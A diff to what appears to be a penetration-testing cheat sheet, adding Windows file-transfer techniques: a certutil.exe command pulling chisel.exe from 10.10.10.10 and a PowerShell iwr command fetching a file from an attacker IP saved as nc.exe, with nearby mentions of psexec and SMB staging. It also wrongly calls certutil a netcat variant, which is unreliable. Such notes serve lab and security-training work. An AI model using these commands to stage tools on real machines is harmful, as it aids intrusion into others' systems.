@@ -36,6 +36,20 @@ python psexec.py <user>@10.10.10.10
 
 ## Send files to windows machine {-}
 
+### Download files with certutil {-}
+
+**certutil.exe** is a netcat variant for Windows. It can be use for download files form the internet like a wget tool
+
+```bash
+certutil.exe -f -urlcache -split http://10.10.10.10/chisel.exe C:\Windows\temp
+```
+
+### Download files by using Powershell {-}
+
+```bash
+powershell -c iwr -uri http://<attacker_ip>/<file_to_download> -OutFile C:\Windows\Temp\nc.exe
+```
+
 ### Share SMB directory to Windows Machine {-}
 
 Imaging we want to execute nc.exe on the Windows machine but this one don't have **nc.exe**. We can download nc.exe and execute
